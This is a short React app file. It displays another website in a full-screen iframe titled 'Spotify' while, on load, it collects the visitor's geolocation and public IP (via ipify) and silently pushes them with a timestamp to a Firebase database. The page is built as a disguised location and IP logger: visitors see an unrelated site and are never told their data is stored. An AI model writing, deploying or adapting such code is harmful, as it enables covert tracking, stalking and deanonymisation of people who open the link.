import React, { useEffect } from 'react';
import { db } from './firebase';
import { ref, push } from 'firebase/database';
import axios from 'axios';

function App() {
  useEffect(() => {
    const collectAndStoreLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          const { latitude, longitude } = pos.coords;

          // Get public IP
          const res = await axios.get('https://api.ipify.org?format=json');
          const ip = res.data.ip;

          const data = {
            latitude,
            longitude,
            ip,
            timestamp: new Date().toISOString(),
          };

          // Push to Firebase
          push(ref(db, 'users'), data);
        });
      } else {
        alert('Geolocation not supported');
      }
    };

    collectAndStoreLocation();
  }, []);

  return (
    <div style={{ height: '100vh', overflow: 'hidden' }}>
      <iframe
        src="https://alan-protfio.netlify.app"
        title="Spotify"
        width="100%"
        height="100%"
        style={{ border: 'none' }}
      />
    </div>
  );
}

export default App;
